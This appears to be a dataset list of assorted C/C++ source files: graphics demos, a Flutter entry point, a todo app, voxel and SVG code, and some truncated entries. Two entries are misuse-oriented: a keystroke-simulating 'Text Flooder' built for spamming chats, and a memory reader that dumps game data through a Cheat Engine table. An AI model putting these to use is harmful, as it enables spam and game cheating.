    "#include<GL/glut.h>\nvoid init(){\n\tglClearColor(0, 0, 0, 1);\n\tglMatrixMode(GL_PROJECTION);\n    glOrtho(-200,200,-200,200,-200,200);\n\n\n}\nvoid display() {\n\tglClear(GL_COLOR_BUFFER_BIT);\n\t//white quad\n\tglBegin(GL_QUADS);\n\tglColor3f(1, 1, 1);\n\tglVertex2i(-20,0);\n\tglVertex2i(-20, 15);\n\tglVertex2i(36, 15);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t//red quad\n\tglColor3f(1, 0, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20,0);\n\tglVertex2i(36,0);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t// blue triangle\n\tglColor3f(0, 0, 1);\n\tglBegin(GL_TRIANGLES);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20, 15);\n\tglVertex2i(-2, 0);\n\tglEnd();\n\t//pole \n\tglColor3f(0, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-25,-75);\n\tglVertex2i(-25,15);\n\tglVertex2i(-20,15 );\n\tglVertex2i(-20, -75);\n\tglEnd();\n\t//base height\n\tglColor3f(1, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-35,-102);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10,-75);\n\tglVertex2i(-10,-102);\n\tglEnd();\n\t// top stand \n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10, -75);\n\tglVertex2i(-15,-83);\n\tglEnd();\n\t//stand hieght\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40, -87);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-15,-83);\n\tglVertex2i(-15,-87);\n\tglEnd();\n\t//middle stand\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-40,-87);\n\tglVertex2i(-15,-87);\n\tglVertex2i(-20,-92);\n\tglEnd();\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-20,-92);\n\tglVertex2i(-20,-97);\n\tglEnd();\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-50,-102);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-20,-97);\n\tglVertex2i(-25,-102);\n\tglEnd();\n\n\tglFlush();\n\n\n}\nint main(int argc,char** argv) {\n\tglutInit(&argc, argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0, 0);\n\tglutInitWindowSize(1000, 700);\n\tglutCreateWindow(\"day one\");\n\tinit();\n\tglutDisplayFunc(display );\n\tglutMainLoop();\n\t\n\n\t\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../headers/GetTexture.h\"\n#include <SDL2/SDL.h>\n#include <SDL2/SDL_image.h>\n#include <SDL2/SDL_ttf.h>\n#include <iostream>\n#include <string>\n\nSDL_Texture *GetTexture(SDL_Renderer *renderer, std::string path) {\n  SDL_Texture *NewTexture = NULL;\n  SDL_Surface *LoadSurface = IMG_Load(path.c_str());\n  if (LoadSurface == NULL)\n    std::cout << \"Image could not be loaded, error : \" << IMG_GetError()\n              << std::endl;\n  else {\n    NewTexture = SDL_CreateTextureFromSurface(renderer, LoadSurface);\n    if (NewTexture == NULL)\n      std::cout << \"Texture could not be created, error : \" << SDL_GetError()\n                << std::endl;\n    SDL_FreeSurface(LoadSurface);\n  }\n  return NewTexture;\n}\n\nSDL_Texture *GetTexture(SDL_Renderer *renderer, TTF_Font *fonts,\n                        std::string text, SDL_Color textColor,\n                        SDL_Rect *textBox) {\n  SDL_Texture *newTexture = NULL;\n  SDL_Surface *loadSurface =\n      TTF_RenderText_Blended(fonts, text.c_str(), textColor);\n  if (loadSurface == NULL)\n    std::cout << \"Text could not be rendererd, error : \" << TTF_GetError()\n              << std::endl;\n  else {\n    newTexture = SDL_CreateTextureFromSurface(renderer, loadSurface);\n    if (newTexture == NULL)\n      std::cout << \"Texture could not be created, error : \" << SDL_GetError()\n                << std::endl;\n    textBox->w = loadSurface->w;\n    textBox->h = loadSurface->h;\n    SDL_FreeSurface(loadSurface);\n  }\n  return newTexture;\n}\n",
    "#include \"KittyUtils.h\"\n\nstatic void xtrim(std::string &hex){\n    if(hex.compare(0, 2, \"0x\") == 0){\n        hex.erase(0, 2);\n    }\n\n    // https://www.techiedelight.com/remove-whitespaces-string-cpp/\n    hex.erase(std::remove_if(hex.begin(), hex.end(), [](char c){\n\t\t\t\t\t\t\t\treturn (c == ' ' || c == '\\n' || c == '\\r' ||\n\t\t\t\t\t\t\t\t\t\tc == '\\t' || c == '\\v' || c == '\\f');\n\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\thex.end());\n}\n\n\nbool KittyUtils::validateHexString(std::string &xstr){\n    if(xstr.length() < 2) return false;\n    xtrim(xstr); // first remove spaces\n    if(xstr.length() % 2 != 0) return false;\n    for(size_t i = 0; i < xstr.length(); i++){\n        if(!std::isxdigit((unsigned char)xstr[i])){\n            return false;\n        }\n    }\n    return true;\n}\n\n\n// https://tweex.net/post/c-anything-tofrom-a-hex-string/\n#include <sstream>\n#include <iomanip>\n\n\n// ------------------------------------------------------------------\n/*!\n    Convert a block of data to a hex string\n*/\nvoid KittyUtils::toHex(\n    void *const data,           //!< Data to convert\n    const size_t dataLength,    //!< Length of the data to convert\n    std::string &dest           //!< Destination string\n    )\n{\n    unsigned char     *byteData = reinterpret_cast<unsigned char*>(data);\n    std::stringstream hexStringStream;\n    \n    hexStringStream << std::hex << std::setfill('0');\n    for(size_t index = 0; index < dataLength; ++index)\n        hexStringStream << std::setw(2) << static_cast<int>(byteData[index]);\n    dest = hexStringStream.str();\n}\n\n\n// ------------------------------------------------------------------\n/*!\n    Convert a hex string to a block of data\n*/\nvoid KittyUtils::fromHex(\n    const std::string &in,     //!< Input hex string\n    void *const data           //!< Data store\n    )\n{\n    size_t          length    = in.length();\n    unsigned char   *byteData = reinterpret_cast<unsigned char*>(data);\n    \n    std::stringstream hexStringStream; hexStringStream >> std::hex;\n    for(size_t strIndex = 0, dataIndex = 0; strIndex < length; ++dataIndex)\n    {\n        // Read out and convert the string two characters at a time\n        const char tmpStr[3] = { in[strIndex++], in[strIndex++], 0 };\n\n        // Reset and fill the string stream\n        hexStringStream.clear();\n        hexStringStream.str(tmpStr);\n\n        // Do the conversion\n        int tmpValue = 0;\n        hexStringStream >> tmpValue;\n        byteData[dataIndex] = static_cast<unsigned char>(tmpValue);\n    }\n}",
    "// dear imgui, v1.85 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other\n// coders will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available\n// debug menu of your game/app! Removing this file from your project is hindering access to documentation for everyone\n// in your team, likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowMisc()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n// System includes\n#include <ctype.h>          // toupp",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstdlib>\n#include <stdexcept>\n#include <chrono>\n#include <thread>\nusing namespace std;\n\n// Change this file name if needed\nconst string userHome = getenv(\"HOME\"); \nconst string mainFile = userHome + \"/.config/todominal/todos.txt\";\n\n// Define colors for priorities\nstring RED = \"\\033[1;31m\";\nstring YELLOW = \"\\033[1;33m\";\nstring GREEN = \"\\033[1;32m\";\nstring RESET = \"\\033[0m\";\n\n// Function to remove a line from a specific line from a file\nvoid removeLine(const string& filename, int lineNumberToRemove) {\n    ifstream inputFile(filename);\n    vector<string> lines;\n\n    if (inputFile.is_open()) {\n        string line;\n        int currentLine = 1;\n        while (getline(inputFile, line)) {\n            if (currentLine != lineNumberToRemove) {\n                lines.push_back(line); // Keep the line if it's not the one to remove\n            }\n            currentLine++;\n        }\n        inputFile.close();\n\n        // Write the modified content back to the file\n        ofstream outputFile(filename);\n        if (outputFile.is_open()) {\n            for (const string& line : lines) {\n                outputFile << line << endl;\n            }\n            outputFile.close();\n        } else {\n            cerr << \"Unable to open output file: \" << filename << endl;\n        }\n    } else {\n        cerr << \"Unable to open input file: \" << filename << endl;\n    }\n}\n\n// Functiom to get a specific line of a file\nstring getLineContent(const string& filename, int lineNumber) {\n    ifstream file(filename);\n    string lineContent;\n    int currentLine = 1;\n\n    if (file.is_open()) {\n        string line;\n        while (getline(file, line)) {\n            if (currentLine == lineNumber) {\n                lineContent = line;\n                break;\n            }\n            currentLine++;\n        }\n        file.close();\n    } else {\n        cerr << \"Unable to open file: \" << filename << endl;\n    }\n\n    return lineContent;\n}\n\n// Function to Replace a line with a given line\nvoid replaceLine(const string& filename, int lineNumber, const string& newLine) {\n    ifstream inputFile(filename);\n    vector<string> lines;\n\n    if (inputFile.is_open()) {\n        string line;\n        int currentLine = 1;\n        while (getline(inputFile, line)) {\n            if (currentLine == lineNumber) {\n                lines.push_back(newLine); // Replace the line with newLine\n            } else {\n                lines.push_back(line); // Keep the original line\n            }\n            currentLine++;\n        }\n        inputFile.close();\n\n        // Write the modified content back to the file\n        ofstream outputFile(filename);\n        if (outputFile.is_open()) {\n            for (const string& line : lines) {\n                outputFile << line << endl;\n            }\n            outputFile.close();\n        } else {\n            cerr << \"Unable to open output file\\n\";\n        }\n    } else {\n        cerr << \"Unable to open input file\\n\";\n    }\n}\n\n// Function to StrikeThrough given text\nstring strikethrough(const string& text) \n{\n    string result;\n    result = \"\\e[9m\" + text + \"\\e[m\"; \n    return result;\n}\n\n// Function to remove a todo, check for int\nvoid removeTodo() {\n    string toRemove;\n    cout << \"Enter Todo Index to Remove: \";\n    std::cin >> toRemove;\n\n    bool isValid = true;\n    for (char c : toRemove) {\n        if (!isdigit(c)) {\n            isValid = false;\n            break;\n        }\n    }\n\n    if (isValid) {\n        int toRemoveint = stoi(toRemove);\n        removeLine(mainFile, toRemoveint);\n    } else {\n        cerr << \"Invalid input. Please enter a valid integer index.\" << endl;\n    }\n}\n\n\n// Function to mark a todo as done\nvoid markDone() {\n    string markInput;\n    cout << \"Enter Todo Index to Mark as Done: \";\n    std::cin >> markInput;\n    int markNum = stoi(markInput);\n    replaceLine(mainFile, markNum, strikethrough(getLineContent(mainFile, markNum)));\n}\n\n// Function to print indexed contents of a file\nvoid printTodo() {\n    int i = 1;\n    ifstream todos(mainFile);\n    if (todos.is_open()) {\n        string line;\n        while (getline(todos, line)) {\n            string color;\n            if (line.find(\"(h)\") != string::npos) {\n                color = RED;\n            } else if (line.find(\"(m)\") != string::npos) {\n                color = YELLOW;\n            } else if (line.find(\"(l)\") != string::npos) {\n                color = GREEN;\n            } else {\n                color = RESET;\n            }\n            cout << i << \". \" << color << line << RESET << endl;\n            i++;\n        }\n        todos.close();\n    } else {\n        cerr << \"Unable to open file\\n\";\n        exit(1);\n    }\n}\n\nvoid printTodoRofi() {\n    RED = \"<span foreground=\\\"#f38ba8\\\">\";\n    YELLOW = \"<span foreground=\\\"#f9e2af\\\">\";\n    GREEN = \"<span foreground=\\\"#a6e3a1\\\">\";\n    RESET = \"</span>\";\n    int i = 1;\n    ifstream todos(mainFile);\n    if (todos.is_open()) {\n        string line;\n        wh",
    "#include \"chunk.h\"\n#include <array>\n#include \"block.h\"\n#include \"glm/detail/type_vec.hpp\"\n#include \"glm/gtc/matrix_transform.hpp\"\n#include \"simple_shader.h\"\n#include \"subchunk_mesh.h\"\n#include \"terrain_generator.h\"\n#include \"utils.h\"\n\nnamespace {}  // namespace\n\n// subchunk\nSubChunk::SubChunk(const ChunkPos& pos, int sub_chunk_index) : chunk_pos_(pos), sub_chunk_index_(sub_chunk_index) {\n    for (int i = 0; i < 16; i++) {\n        for (int j = 0; j < 16; j++) {\n            for (int k = 0; k < 16; k++) {\n                block_volume_[i][j][k] = air;\n            }\n        }\n    }\n}\n\nvoid SubChunk::createMesh() {\n    this->mesh_ = new SubChunkMesh();\n    for (int x = 0; x < 16; x++) {\n        for (int y = 0; y < 16; y++) {\n            for (int z = 0; z < 16; z++) {\n                auto b = getBlock(x, y, z);\n                auto p = BlockPos{x, y, z};\n                if (b == air) continue;\n                if (!hasBlock(x + 1, y, z)) mesh_->AddFace({px, b, p});\n                if (!hasBlock(x - 1, y, z)) mesh_->AddFace({nx, b, p});\n                if (!hasBlock(x, y + 1, z)) mesh_->AddFace({py, b, p});\n                if (!hasBlock(x, y - 1, z)) mesh_->AddFace({ny, b, p});\n                if (!hasBlock(x, y, z + 1)) mesh_->AddFace({pz, b, p});\n                if (!hasBlock(x, y, z - 1)) mesh_->AddFace({nz, b, p});\n            }\n        }\n    }\n    mesh_->buildData();\n}\n\nBlockType SubChunk::getBlock(int sx, int sy, int sz) {\n    if (sx < 0 || sy < 0 || sz < 0 || sx >= 16 || sy >= 16 || sz >= 16) return air;\n    return block_volume_[sx][sy][sz];\n}\n\nvoid SubChunk::setBlock(int sx, int sy, int sz, BlockType type) {\n    if (sx < 0 || sy < 0 || sz < 0 || sx >= 16 || sy >= 16 || sz >= 16) return;\n    block_volume_[sx][sy][sz] = type;\n}\n\nvoid SubChunk::draw(Shader* shader) {\n    if (this->mesh_) {\n        auto model = glm::translate(\n            glm::mat4(1.0), glm::vec3(this->chunk_pos_.x * 16, this->sub_chunk_index_ * 16, this->chunk_pos_.z * 16));\n        shader->setMat4(\"model\", model);\n        this->mesh_->draw();\n    }\n}\n\nbool SubChunk::hasBlock(int sx, int sy, int sz) {\n    if (sx < 0 || sy < 0 || sz < 0 || sx >= 16 || sy >= 16 || sz >= 16) return false;\n    return block_volume_[sx][sy][sz] != air;\n}\n\nvoid SubChunk::trySendData() {\n    if (has_send_data_) return;\n    has_send_data_ = true;\n    if (this->mesh_) this->mesh_->sendData();\n}\n\nChunk::Chunk(const ChunkPos& pos, AbstractTerrainGenerator* generator) {\n    this->pos_ = pos;\n    for (int i = 0; i < 16; i++) {\n        this->sub_chunks_[i] = new SubChunk(this->pos_, i);\n    }\n    this->init(generator);\n}\n\nChunk::~Chunk() {\n    for (auto sub : this->sub_chunks_) {\n        delete sub;\n    }\n}\n\nvoid Chunk::setBlock(int cx, int y, int cz, BlockType type) {\n    this->sub_chunks_[y / 16]->setBlock(cx, y % 16, cz, type);\n}\n\nvoid Chunk::init(AbstractTerrainGenerator* generator) {\n    if (generator) {\n        generator->fill(this);\n    }\n    for (auto& sub : this->sub_chunks_) {\n        sub->createMesh();\n    }\n}\n\nvoid Chunk::draw(Shader* shader) {\n    for (int i = 0; i < 16; i++) {\n        if (this->sub_chunks_[i]) this->sub_chunks_[i]->draw(shader);\n    }\n}\n\nvoid Chunk::trySendData() {\n    for (int i = 0; i < 16; i++) {\n        if (this->sub_chunks_[i]) this->sub_chunks_[i]->trySendData();\n    }\n}",
    "#include <iostream>\n#include <string>\n#include <Windows.h>\n\nbool final = false;\n\nvoid escribir(const std::string& text) {\n    for (char c : text) {\n        INPUT input[2];\n        input[0].type = INPUT_KEYBOARD;\n        input[0].ki.wVk = 0;\n        input[0].ki.wScan = c;\n        input[0].ki.dwFlags = KEYEVENTF_UNICODE;\n        input[0].ki.time = 0;\n        input[0].ki.dwExtraInfo = 0;\n\n        input[1] = input[0];\n        input[1].ki.dwFlags |= KEYEVENTF_KEYUP;\n\n        SendInput(2, input, sizeof(INPUT));\n        Sleep(10);\n    }\n    final = true;\n}\n\nvoid Enter() {\n    keybd_event(VK_RETURN, 0, 0, 0);\n}\n\nvoid soltar_enter() {\n    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);\n}\n\nvoid flood(const std::string& texto, int cantidadVeces) {\n    for (int i = 0; i < cantidadVeces; ++i) {\n        Sleep(1);\n        \n        escribir(texto + \"\\n\");\n        Enter();\n        soltar_enter();\n\n        Sleep(50);\n    }\n    Sleep(3000);\n}\n\nint main() {\n    SetConsoleTitle(\"Text Flooder\");\n    std::string logo = R\"(\n _______               __        _______ __                 __             \n|_     _|.-----.--.--.|  |_     |    ___|  |.-----.-----.--|  |.-----.----.\n  |   |  |  -__|_   _||   _|    |    ___|  ||  _  |  _  |  _  ||  -__|   _|\n  |___|  |_____|__.__||____|    |___|   |__||_____|_____|_____||_____|__|  \n    )\";\n\n    std::cout << logo << std::endl;\n\n    std::cout << \"Ingresa el texto que quieres escribir: \";\n    std::string texto;\n    getline(std::cin, texto);\n\n    std::cout << \"Ingresa la cantidad de veces que deseas escribir el texto: \";\n    int cantidadVeces;\n    std::cin >> cantidadVeces;\n\n    std::cout << \"\\nPresiona la tecla SHIFT para iniciar el spam.\\n\";\n\n    while (1) {\n        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {\n            std::cout << \"\\n\\nIniciando spam en 5 segundos...\\n\\n\";\n            \n            Sleep(5000);\n            flood(texto, cantidadVeces);\n\n            while (!final) {\n                Sleep(1000);\n            }\n            \n            std::cout << \"Spam terminado.\" << std::endl;\n            Sleep(2000);\n            return 0;\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"ChooserDialog.h\"\n\nvoid ChooserDialog::init(GtkFileChooserAction action, string title, string cancel_name, string accept_name) {\n    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);\n    gtk_window_set_title(GTK_WINDOW(window), title.c_str());\n\n    dialog = gtk_file_chooser_dialog_new(title.c_str(),\n                                         GTK_WINDOW(window),\n                                         action,\n                                         cancel_name.c_str(),\n                                         GTK_RESPONSE_CANCEL,\n                                         accept_name.c_str(),\n                                         GTK_RESPONSE_ACCEPT,\n                                         NULL);\n}\nstring ChooserDialog::run() {\n    string path;\n    res = gtk_dialog_run(GTK_DIALOG(dialog));\n    if (res == GTK_RESPONSE_ACCEPT) {\n        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);\n        path = gtk_file_chooser_get_filename(chooser);\n    } else if (res == GTK_RESPONSE_CANCEL) {\n        gtk_widget_destroy(dialog);\n        throw runtime_error(\"The user has closed the path selection window\");\n    } else {\n        gtk_widget_destroy(dialog);\n        throw runtime_error(\"[!] Unexpected error\");\n    }\n\n    gtk_widget_destroy(dialog);\n\n    return path;\n}",
    "#include \"um.h\"\r\n#include \"json.h\"\r\n#include <fstream>\r\n\r\nusing nlohmann::json;\r\n\r\nint main( ) {\r\n    // Setup\r\n    cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup();\r\n\r\n    // Get module\r\n    auto game_assembly = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module(L\"GameAssembly.dll\");\r\n\r\n    // Read JSON input\r\n    std::ifstream input(\"json.txt\");\r\n    nlohmann::json crazy_swag;\r\n    input >> crazy_swag;\r\n    input.close();\r\n\r\n    // Open output file\r\n    std::ofstream output(\"material_output.txt\");\r\n\r\n    // Process each entry in the JSON\r\n    auto crazy_sneed = crazy_swag[\"CheatTable\"][\"CheatEntries\"][\"CheatEntry\"];\r\n    for (auto& entry : crazy_sneed) {\r\n        // Extract address\r\n        std::string addr_s = entry[\"Address\"];\r\n        unsigned long long crazy_value;\r\n        std::istringstream iss(addr_s);\r\n        iss >> std::hex >> crazy_value;\r\n        crazy_value -= 0x88;\r\n\r\n        // Read name\r\n        char material_name[255];\r\n        auto material_addy = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uintptr_t>(crazy_value + 0x30);\r\n        cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read(material_addy, material_name, 255);\r\n        material_name[254] = 0;\r\n        std::string name(material_name);\r\n\r\n        // Read key\r\n        auto material_address = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uint32_t>(crazy_value + 0x8);\r\n\r\n        // Write to output file\r\n        output << \"material name: \" << name << \", material address: \" << material_address << \"\\n\";\r\n    }\r\n\r\n    // Close output file\r\n    output.close();\r\n\r\n    return 0;\r\n}",
    "#include \"svgboxmodel.h\"\n#include \"svgresourcebox.h\"\n\nnamespace plutobook {\n\nbool SVGRenderState::hasCycleReference(const Box* box) const\n{\n    auto current = this;\n    do {\n        if(box == current->box())\n            return true;\n        current = current->parent();\n    } while(current);\n    return false;\n}\n\nvoid SVGBlendInfo::beginGroup() const\n{\n    if(m_requiresCompositing) {\n        m_state->pushGroup();\n    } else {\n        m_state->save();\n    }\n\n    m_state->setTransform(m_state.currentTransform());\n    if(m_clipper && !m_requiresCompositing) {\n        m_clipper->applyClipPath(m_state);\n    }\n}\n\nvoid SVGBlendInfo::endGroup() const\n{\n    if(m_requiresCompositing) {\n        if(m_clipper)\n            m_clipper->applyClipMask(m_state);\n        if(m_state.mode() == SVGRenderMode::Display) {\n            if(m_masker)\n                m_masker->applyMask(m_state);\n            m_state->popGroup(m_opacity, m_blendMode);\n        } else {\n            m_state->popGroup(1.0);\n        }\n    } else {\n        m_state->restore();\n    }\n}\n\nbool SVGBlendInfo::requiresCompositing(SVGRenderMode mode) const\n{\n    return (m_clipper && m_clipper->requiresMasking()) || (mode == SVGRenderMode::Display && (m_masker || m_opacity < 1.f || m_blendMode > BlendMode::Normal));\n}\n\nvoid SVGPaintServer::applyPaint(const SVGRenderState& state) const\n{\n    if(m_painter) {\n        m_painter->applyPaint(state, m_opacity);\n    } else {\n        state->setColor(m_color.colorWithAlpha(m_opacity));\n    }\n}\n\nSVGBoxModel::SVGBoxModel(SVGElement* element, const RefPtr<BoxStyle>& style)\n    : Box(element, style)\n{\n    setInline(false);\n}\n\nvoid SVGBoxModel::build()\n{\n    m_clipper = element()->getClipper(style()->clipPath());\n    m_masker = element()->getMasker(style()->mask());\n    Box::build();\n}\n\nconst Rect& SVGBoxModel::paintBoundingBox() const\n{\n    if(m_paintBoundingBox.isValid())\n        return m_paintBoundingBox;\n    m_paintBoundingBox = strokeBoundingBox();\n    assert(m_paintBoundingBox.isValid());\n    if(m_clipper)\n        m_paintBoundingBox.intersect(m_clipper->clipBoundingBox(this));\n    if(m_masker) {\n        m_paintBoundingBox.intersect(m_masker->maskBoundingBox(this));\n    }\n\n    return m_paintBoundingBox;\n}\n\n} // namespace plutobook\n",
    "#include \"fmt_eigen.h\"\n#include \"fmt/color.h\"\nint main() {\n    Eigen::Matrix<double, 2, 2> matrix;\n    matrix << 1.234567, 2.345678, 3.456789, 4.567890;\n\n    Eigen::Matrix<double, 2, 2> transposed = matrix.transpose();\n    Eigen::Vector3d vec(1, 2, 3);\n\n    fmt::print(\"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(\"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec); // Specify precision of 4\n\n    fmt::print(\"Matrix Transposed:\\n{:.4f}\\n\", transposed); // Specify precision of 4\n    fmt::print(\"Matrix col or row:\\n{:.4f}\\n\", matrix.col(0)); // Specify precision of 4\n    fmt::print(\"Matrix Bolck:\\n{}\\n\", matrix.block<1,1>(0,0)); // Specify precision of 4\n    fmt::print(\"Matrix Diagonal:\\n{}\\n\", matrix.diagonal()); // Specify precision of 4\n\n    fmt::print(fg(fmt::color::steel_blue), \"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(bg(fmt::color::lime_green)|fg(fmt::color::indian_red),\n               \"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec);\n    fmt::print(fg(fmt::color::gold)|fmt::emphasis::blink, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n    fmt::print(fg(fmt::color::steel_blue)|fmt::emphasis::bold, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n\n    getchar();\n    return 0;\n}\n",
